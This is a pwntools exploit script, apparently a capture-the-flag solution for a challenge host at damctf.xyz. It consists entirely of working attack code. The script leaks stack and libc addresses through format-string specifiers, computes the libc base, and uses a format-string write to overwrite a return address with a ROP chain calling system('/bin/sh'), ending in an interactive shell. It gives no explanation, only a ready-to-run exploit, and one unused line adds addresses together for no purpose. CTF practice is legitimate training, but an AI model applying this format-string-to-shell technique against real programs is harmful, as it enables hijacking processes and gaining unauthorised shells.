#!/usr/bin/env python3

from pwn import *

elf = ELF("main_patched")
libc = ELF("libc-2.24.so")
ld = ELF("ld-2.24.so")

context.binary = elf
context.terminal = ['kitty','-e']

gdbscript = '''
b*main+89
c
'''

if args.REMOTE:
	p = remote('dnd.chals.damctf.xyz',30813)
elif args.GDB:
	p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
	p = process(elf.path)

ld_offset = b'%205$p'
offset = 8
to_libc = 0x3c3770

p.sendline(b'%p')
leak = int(p.recvline(),16)
print(hex(leak))

#0x7ffe59bfdd18
libc.address = leak - to_libc
print(hex(libc.address))

one_gadget_addr1 = 0x4557a  # [rsp+0x30] == NULL
one_gadget_addr2 = 0xf0a51  # [rsp+0x40] == NULL
one_gadget_addr3 = 0xf18cb  # [rsp+0x60] == NULL



p.sendline(b'%2$p')
leak = int(p.recvline(),16)

ret_addr = leak - 24
print("ret addr:",hex(ret_addr))

bin_sh = next(libc.search(b"/bin/sh"))
shellcode = libc.address + 0x000000000001fd7a + bin_sh + libc.sym.system

writes = {
	ret_addr: libc.address + 0x000000000001fd7a,
	ret_addr+8 : bin_sh,
	ret_addr + 16 : libc.sym.system
}

payload = fmtstr_payload(9, writes)

p.sendline(payload)

p.interactive()